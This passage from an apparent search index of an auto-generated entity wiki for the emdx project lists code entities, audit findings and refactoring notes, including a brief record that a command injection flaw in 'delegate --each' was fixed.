-&gt; int | None: <code>`` **Why:** The function is a thin wrapper around</code>create_task()`. Looking at the call sites (lines 492-502, etc.), it always uses explicit keyword arguments. Converting to explicit parameters enables type checking at call sites....</p> </li> <li> <p>#6489 None Type Analysis [4/7]</p> </li> </ul> File Total <code>| None</code> Necessary Unnecessary tasks.py 18 18 0 executions.py 16 16 0 tags.py 2 2 0 categories.py 2 2 0 Total 38 ... <ul> <li>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Task Lifecycle and State Management </li> <li>Task Creation: <code>create_task()</code> with metadata</li> <li>Activation: Set status to <code>active</code></li> <li>Execution: Create <code>task_execution</code> record</li> <li>Progress: Log via <code>log_progress()</code></li> <li> <p>Completion...</p> </li> <li> <p>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4]   Section: emdx/commands/delegate.py</p> </li> <li>Location: Line 53</li> <li>Current Type: <code>**kwargs: Any</code></li> <li> <p>Actual Type: Should use specific keyword arguments matching <code>create_task()</code> signature, or create a TypedDict <code>CreateTaskParams</code></p> </li> <li> <p>#6396 Delegate: DB Safety Fixes (Tasks #620, #624, #626, #629)   Section: Summary</p> <p>...<code>,</code>get_stats()`</p> </li> <li><code>tags.py</code>: <code>get_or_create_tag()</code>, <code>merge_tags()</code></li> <li><code>tasks.py</code>: <code>create_task()</code> epic_seq</li> <li><code>executions.py</code>: <code>get_execution_stats()</code></li> <li> <p><code>groups.py</code>: <code>get_recursive_doc_count()</code>, <code>_update_group_metrics()</code></p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]   Section: Summary</p> <p><code>create_task()</code> accepts a <code>status</code> parameter with default \"open\" but never validates it against <code>STATUSES</code> tuple defined on line 14. Invalid statuses like \"pending\" or \"in_progress\" can be inserted.</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Areas for Improvement</p> <p>..., SQL queries</p> </li> <li><code>tags.py</code>: <code>get_tag()</code>, <code>create_tag()</code>, SQL queries</li> <li> <p><code>tasks.py</code>: <code>create_task()</code>, <code>update_task()</code>, SQL queries</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Task Lifecycle</p> </li> <li>Task Creation: <code>create_task()</code> with prompt, type, tags, dependencies</li> <li>Status Update: Set <code>active</code> when starting</li> <li>Execution Record: Create <code>task_execution</code> linking to <code>execution_id</code> 4....</li> </ul>"},{"location":"entities/createtask/#summary","title":"Summary","text":""},{"location":"entities/createtask/#execution-flow","title":"Execution Flow","text":""},{"location":"entities/createtask/#38-_safe_create_taskkwargs-any","title":"38. <code>_safe_create_task(**kwargs: Any)</code>","text":""},{"location":"entities/createtask/#execution-flow_1","title":"Execution Flow","text":""},{"location":"entities/createtask/#related-entities","title":"Related Entities","text":"<ul> <li><code>unpack[typeddict]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>task types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>task granularity</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>status flow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>services layer integration points</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>sequential pipeline</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>recovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>models layer commands layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>model layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>allowed_fields</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/createworktree/","title":"create_worktree()","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-14</p>"},{"location":"entities/createworktree/#documents-9","title":"Documents (9)","text":"<ul> <li>#6483 Delegate: Kink 5: Unify delegate branch naming in emdx/commands/delega [2/3]   Section: Problem <ol> <li><code>create_worktree()</code> in <code>git.py</code>: Used <code>worktree-{timestamp}-{pid}-{random}</code> - purely random, no task context</li> </ol> </li> <li> <p><code>_run_parallel()</code>: Used <code>{prefix}/{slug}-{n}</code> where prefix was \"fi...</p> </li> <li> <p>#6342 Delegate: Document #6330 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/createworktree/#emdx-arc-212","title":"EMDX Arc [2/12]","text":"<p>Section: Changes Made</p> <p>The git_ops.py already had a more featured <code>create_worktree()</code> with different signature:</p> <pre><code>create_worktree(branch_name, path=None, base_branch=None, repo_path=None) -&gt; Tuple[bool, str, str]\n</code></pre> <ul> <li> <p>#6335 Architecture Refactoring Assessment - February 2026   Section: Issue 5: Duplicate Git Utilities (NOT ADDRESSED)</p> <p>Analysis Finding: <code>git.py</code> and <code>git_ops.py</code> with duplicate <code>create_worktree()</code> functions.</p> </li> <li> <p>#6332 Architecture Analysis Summary - Key Takeaways   Section: Medium-Term Refactors</p> <ol> <li>Split <code>migrations.py</code> into directory with 1 file per migration</li> </ol> </li> <li>Merge <code>git.py</code> + <code>git_ops.py</code> (duplicate <code>create_worktree()</code>)</li> <li>Move execution code from <code>utils/</code> to <code>services/execution/</code></li> <li> <p>Add presenters to LogBrowser and CascadeBrowser</p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Code Organization Issues</p> <ol> <li>Git utilities split across files: <code>git.py</code> (129 lines) and <code>git_ops.py</code> (753 lines) with duplicate <code>create_worktree()</code> functions</li> </ol> </li> <li> <p>#6329 Delegate: Analyze emdx/utils/ and emdx/config/ for architecture improv [5/10]   Section: Issue 1: git.py vs git_ops.py Overlap</p> <p>git.py:16-47 - <code>create_worktree()</code> - basic worktree creation git_ops.py:671-723 - <code>create_worktree()</code> - more featured version</p> </li> <li> <p>#6311 Delegate: Analyze DEAD CODE &amp; DUPLICATION across emdx/ (exclude ui/ an [8/15]   Section: 1. MAJOR DUPLICATION: git.py vs git_ops.py (HIGH PRIORITY)</p> Function git.py git_ops.py <code>create_worktree()</code> \u2713 (simple) \u2713 (full-featured) <code>get_git_project()</code> \u2713 - <code>cleanup_worktree()</code> \u2713 <code>remove_worktree()</code> \u2713 <code>get_repository_root()</code> - \u2713 `get_w... </li> <li> <p>#6304 Delegate: Analyze NAMING &amp; CLARITY across emdx/ (exclude ui/ and tests [1/15]   Section: 1. Module Duplication Pattern (High Impact)</p> <p>...ctions | |------|---------|-----------| | <code>utils/git.py</code> | Basic git operations | <code>create_worktree()</code>, <code>cleanup_worktree()</code>, <code>get_git_project()</code> | | <code>utils/git_ops.py</code> | Extended git operations | <code>create_worktree()</code>, <code>get_worktrees()</code>, <code>GitWorktree</code>, <code>GitProject</code> |</p> </li> <li> <p>#6222 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: Utils (Medium Priority)</p> <p>...()<code>,</code>discover_projects_from_worktrees()<code>,</code>get_worktrees()<code>,</code>get_git_status()<code>,</code>create_worktree()<code>,</code>remove_worktree()<code>| MEDIUM | Test with mocked subprocess calls, test parsing of git output | |</code>utils/claude_wrapper.py` | Claude CLI integration | MEDIUM | Test...</p> </li> </ul>"},{"location":"entities/createworktree/#related-entities","title":"Related Entities","text":"<ul> <li><code>lazy loading in main.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>gitproject</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>get_worktrees()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>services/execution/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>remove_worktree()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>merge git utilities</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>gitfilestatus</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>get_git_status()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>event-driven file watchers</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>duplicate truncate functions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/critical-command-injection-vulnerability/","title":"critical command injection vulnerability","text":"<p>Type: concept | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/critical-command-injection-vulnerability/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6465 Security Audit and Fixes: EMDX Command Injection Vulnerability   Section: Executive Summary</p> <p>A comprehensive security audit of the EMDX project identified a critical command injection vulnerability in the <code>delegate --each</code> feature. This vulnerability allowed arbitrary command execution through shell injection and has been successfully remediated through multi...</p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]   Section: Summary</p> <p>Fixed a critical command injection vulnerability (CVE-level severity) in the <code>emdx delegate --each</code> flag, as identified in security audit document #6230.</p> </li> <li> <p>#6265 Delegate: Document #6230 - Security Fix Implementation   Section: Summary</p> <p>Successfully implemented a fix for the critical command injection vulnerability identified in the security audit (Document #6230).</p> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> <p>Fixed a critical command injection vulnerability in the <code>emdx delegate --each</code> feature.</p> </li> <li> <p>#6250 Delegate: Security Fix - Command Injection in --each   Section: Summary</p> <p>Fixed the critical command injection vulnerability identified in Document #6230 (Security Audit).</p> </li> <li> <p>#6240 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [4/37]   Section: Summary</p> <p>Fixed critical command injection vulnerability in <code>emdx delegate --each</code> identified in document #6230 (Security Audit Report).</p> </li> </ul>"},{"location":"entities/critical-command-injection-vulnerability/#related-entities","title":"Related Entities","text":"<ul> <li><code>shell metacharacter blocking</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>mdfind</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>emdx/commands/delegate.py:141</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>allowlist validation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>2. shell metacharacter blocking</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>3. safe execution</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>vulnerability details</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.2)</li> <li><code>1. command allowlist</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>command allowlist only</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/critical-issues/","title":"critical issues","text":"<p>Type: heading | Mentioned in: 13 documents | First seen: 2026-01-10</p>"},{"location":"entities/critical-issues/#documents-13","title":"Documents (13)","text":"<ul> <li>#6475 Dead Code and Error Handling Audit: emdx Project </li> </ul>"},{"location":"entities/critical-issues/#dead-code-and-error-handling-audit-emdx-project","title":"Dead Code and Error Handling Audit: emdx Project","text":""},{"location":"entities/critical-issues/#executive-summary","title":"Executive Summary","text":"<p>A comprehensive audit of the emdx codebase reveals significant technical debt in error handling and dead code. Key findings include:</p> <ul> <li> <p>35+ silent exception handlers (`exce...</p> </li> <li> <p>#6386 Delegate: Research how Claude Code specifically works as an agent \u2014 wh [3/4]</p> <p>What's Lost</p> </li> </ul> <p>Persists across sessions: - Full CLAUDE.md files (all hierarchical levels) - First 200 lines of auto memory - Topic files (on-demand) - Conversation history (with <code>--continue</code> or <code>--resume</code>) - Git state and worktree context</p> <p>**Lost o...</p> <ul> <li>#6376 Codebase Bug Audit 2026-02-15 [1/10] </li> </ul> <p>Audit Date: 2026-02-15 Scope: connection.py, documents.py, migrations.py, search.py, cascade.py, groups.py Categories: SQL injection, unclosed connections, race conditions, error handling, transactio...</p> <ul> <li>#6234 Delegate: Tech Debt Category Audit 2026-02-14 [14/14]   Section: CATEGORY 1: Exception Handling &amp; Error Management </li> <li>31 bare <code>except Exception:</code> blocks across 18 files</li> <li> <p>Highest concentration: <code>ui/search/search_screen.py</code> (5), <code>ui/document_browser.py</code> (3), `ui/cascade/casca...</p> </li> <li> <p>#4894 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Executive Summary</p> <p>...omprehensive type annotations, and solid foundational patterns. However, several critical issues demand immediate attention, particularly around algorithmic complexity, exception handling, and test coverage gaps.</p> </li> <li> <p>#6531 Delegate synthesis [synthesis]   Section: Quality Assessment Summary</p> PR Quality Test Coverage Critical Issues #652 \u2b50\u2b50\u2b50\u2b50 Comprehensive (~440 lines) Timeout flag not wired up #651 \u2b50\u2b50\u2b50\u2b50\u2b50 Existing tests pass ... </li> <li> <p>#6332 Architecture Analysis Summary - Key Takeaways</p> </li> </ul>"},{"location":"entities/critical-issues/#emdxdatabase-bug-audit-report","title":"emdx/database/ Bug Audit Report","text":""},{"location":"entities/critical-issues/#critical-issues_1","title":"Critical Issues","text":""},{"location":"entities/critical-issues/#emdx-architecture-analysis-key-takeaways","title":"EMDX Architecture Analysis - Key Takeaways","text":""},{"location":"entities/critical-issues/#critical-issues-priority-order","title":"Critical Issues (Priority Order)","text":"<ol> <li> <p><code>models/</code> directory misnamed - Contains SQL operations (repositories), not domain models.</p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Metrics</p> Metric Value Total lines of code ~37,000 Files analyzed 132 Critical issues 4 High-priority patterns 6 Estimated reducible lines 500-800 Monolithic files (&gt;700 LOC) 6 </li> <li> <p>#6309 Delegate: Analyze FUNCTION COMPLEXITY across emdx/ (exclude ui/ and tests/)   Section: Top 15 Worst Offenders (Ranked by Severity)</p> Severity Lines Nest File Function Critical Issues 129.4 294 8 <code>services/unified_executor.py:199</code> <code>execute()</code> Massive 300-line functio... </li> <li> <p>#6235 Delegate: tech-debt,audit,comprehensive [12/14]</p> <p>The debt falls into categories ranging from Critical (blocking issues) to Low (quality-of-life improvements). ### Debt Severity Distribution</p> </li> <li>\ud83d\udd34 Critical: 3 items</li> <li>\ud83d\udfe0 High: 6 items</li> <li>\ud83d\udfe1 Medium: 10 items</li> <li>\ud83d\udfe2 Low: 8 items</li> </ol>"},{"location":"entities/critical-issues/#_1","title":"...","text":"<ul> <li>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Recommendations </li> <li>Files audited: 50+</li> <li>Critical issues: 8</li> <li>High severity: 12</li> <li>Medium severity: 17</li> <li>Low severity: 10</li> <li> <p>Total: 47 findings</p> </li> <li> <p>#6218 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]</p> </li> </ul>"},{"location":"entities/critical-issues/#stats","title":"Stats","text":""},{"location":"entities/critical-issues/#apiinterface-debt-audit-emdx-cli","title":"API/Interface Debt Audit: EMDX CLI","text":""},{"location":"entities/critical-issues/#summary","title":"Summary","text":"<p>This audit examines all CLI commands in the emdx knowledge base tool for inconsistent argument naming, missing input validation, inconsistent error output formats, silent success/failures, missing hel...</p> <ul> <li>#4422 Tech Debt Discovery - Discovery Synthesis   Section: Key Findings <p>Critical Issues (3):</p> </li> <li>Duplicate DEFAULT_ALLOWED_TOOLS - Same constant defined in <code>document_executor.py</code> and <code>claude_executor.py</code>, plus hardcoded variants in 4+ workflow file...</li> </ul>"},{"location":"entities/critical-issues/#related-entities","title":"Related Entities","text":"<ul> <li><code>medium severity issues</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>medium issues</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>low severity issues</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>low issues</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>high issues</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>fix this sprint</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>unused imports</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>screenswitchingmixin</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>metrics summary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>lazy loading in main.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/cursor/","title":"cursor","text":"<p>Type: heading | Mentioned in: 9 documents | First seen: 2026-02-14</p>"},{"location":"entities/cursor/#documents-9","title":"Documents (9)","text":"<ul> <li>#6387 Delegate: Research the competitive landscape for AI agent tooling in 2 [1/4]   Section: MCP Memory Servers <p>...PM package)</p> </li> <li><code>mcp-memory-service</code> - automatic context memory for Claude, VS Code, Cursor, and 13+ AI tools</li> <li> <p>OpenMemory MCP - creates shared memory across Claude and Cursor</p> </li> <li> <p>#6600 Delegate: Fix PR #689 on branch delegate/remove-any-remaining-referenc   Section: Conflict Resolution</p> <p>The PR removes Cursor IDE references and dead code. Main had already incorporated most of these changes independently (model updates to <code>claude-opus-4-6</code>, removal of <code>CURSOR</code> enum, deletion of <code>cursor.py</code>).</p> </li> <li> <p>#6585 Delegate: Remove any remaining references to 'cursor' or 'Cursor' in c [2/2]   Section: Summary</p> <p>Removed all references to 'Cursor' (the IDE/CLI product) from comments, docstrings, string literals, and dead code across the codebase. SQLite <code>cursor</code> objects and TUI cursor navigation references were correctly preserved.</p> </li> <li> <p>#6318 Delegate: Fix ruff violations on the current main branch. Run 'ruff ch   Section: Summary</p> <p>...F841 (Unused variable): Removed <code>next_stage</code>, <code>file_size</code>, <code>children_active</code>, <code>cursor</code>, <code>timeout_modifier</code>, <code>writer</code>, <code>conflicts</code></p> </li> <li> <p>F601 (Duplicate dict key): Removed duplicate <code>AgentHistoryModal</code> key in keybindings/context.py</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 5. ASSIGNED BUT NEVER USED VARIABLES</p> <p>...ult`</p> </li> <li><code>emdx/utils/git_ops.py:741</code> - <code>result</code></li> <li><code>emdx/models/executions.py:194</code> - <code>cursor</code></li> <li><code>emdx/models/executions.py:264</code> - <code>timeout_modifier</code></li> <li><code>emdx/commands/executions.py:71</code> - <code>file_size</code></li> <li><code>emdx/commands/status.py:94</code> - <code>children_active</code></li> <li> <p>`emdx/c...</p> </li> <li> <p>#6669 Prime Command Redesign Research [1/3]   Section: The Two Paradigms</p> <p>The industry has split into pre-indexed RAG (Cursor, Copilot, Windsurf, Augment) vs agentic discovery (Claude Code). The trend is converging toward a hybrid \u2014 Continue.dev just deprecated its <code>@Codebase</code> RAG provi...</p> </li> <li> <p>#6668 Prime Command Redesign: External Tool Research [synthesis]   Section: 1. Two Competing Paradigms Have Emerged</p> <p>Pre-indexed RAG (Cursor, Continue, Copilot, Windsurf, Augment) vs. Agentic Discovery (Claude Code, and now Continue's new direction).</p> </li> <li> <p>#6667 Prime Command Redesign: External Tool Research [4/4]   Section: Other Notable Tools</p> Tool Approach Key Innovation Cursor Hierarchical (L1-L4) embedding + cloud RAG Dynamic context compression (47% fewer tokens) Windsurf Full codebase RAG + real-time IDE signals Memori... </li> </ul>"},{"location":"entities/cursor/#related-entities","title":"Related Entities","text":"<ul> <li><code>aider</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>writer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>windsurf</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>resolve merge conflicts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>prime redesign</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>pre-indexed rag</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>origin/main</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>force-pushed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>fix pr #689: rebase and resolve merge conflicts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>delegate/remove-any-remaining-references-to-curso-90eaf</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/database-schema/","title":"database schema","text":"<p>Type: heading | Mentioned in: 14 documents | First seen: 2025-07-07</p>"},{"location":"entities/database-schema/#documents-14","title":"Documents (14)","text":"<ul> <li>#6472 EMDX Task System: Architecture, Data Model, and Integration <p>Originally evolved from a workflow system, it now serves as the persistent record of all AI delegations, centering around the <code>emdx delegate</code> command for execution and task management. ## Core Architecture</p> </li> </ul>"},{"location":"entities/database-schema/#system-components","title":"System Components","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500...\n\n- **#6182** Delegate: analysis,task-system [13/15]\n  &gt; It provides hierarchical task management, dependency tracking, execution history, and status monitoring. ## Architecture\n\n### Core Components\n\n</code></pre> <p>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502                        Task Syste...</p> <ul> <li>#6158 Delegate: analysis [5/5] <p>Cascade Pipeline (<code>emdx cascade</code>) Autonomous idea-to-code transformation:</p> </li> </ul> <pre><code>idea \u2192 prompt \u2192 analyzed \u2192 planned \u2192 done (PR)\n</code></pre>"},{"location":"entities/database-schema/#4-tui-browser","title":"4. TUI Browser","text":"<ul> <li>50+ UI components across activity view, cascade browser, log browser</li> <li>Vim-style navigation</li> <li> <p>Comm...</p> </li> <li> <p>#276 CLAUDE-KNOWLEDGE-SYSTEM-DESIGN</p> <p>claude-cat      # Raw output for piping <pre><code>\n### 3. Quick Export\n```fish\n# Copy to clipboard\nclaude-copy &lt;id/title&gt;    \n\n# Export to file\nclaude-export &lt;id/title&gt; output.md\n\n# Combine multiple\nclaude-combine --tags \"api\" &gt; api-docs.md\n</code></pre> <p>...</p> <ul> <li>#178 README <p>Run the setup script: <code>./setup-from-checkpoint.fish</code></p> </li> <li>Source the functions: <code>source db-functions.fish</code></li> </ul>"},{"location":"entities/database-schema/#usage","title":"Usage","text":"<pre><code>db-list                    # List all documents\ndb-view &lt;name&gt;            # View a document (with tab completion!)\ndb-search &lt;...\n\n- **#14** Document Version Tracking System Design\n  *Section: Rollout Plan*\n  &gt; ### Phase 1: Core Infrastructure (Week 1)\n- Deploy database schema\n- Implement basic version trigger\n- Add claude-history command\n\n- **#251** Claude Backup and Restore System\n  *Section: Backup Components*\n  &gt; ### 2. **Database Schema**\n- Table definitions\n- Indexes\n- Stored procedures/functions\n- Triggers\n\n- **#6693** Delegate: Research UX patterns for surfacing multi-method document lin [4/4]\n  *Section: 2. Tiered display in `view --links` (separate sections)*\n  &gt; Entity Matches (17, showing top 5):\n    #102 Database Schema           95%  (4 shared: SQLite, migrations, FTS5, schema)\n    #88  CLI Architecture          80%  (2 shared: Typer, Python)\n    ...\n    [dim]12 more \u2014 use --all-li...\n\n- **#6191** Delegate: analysis 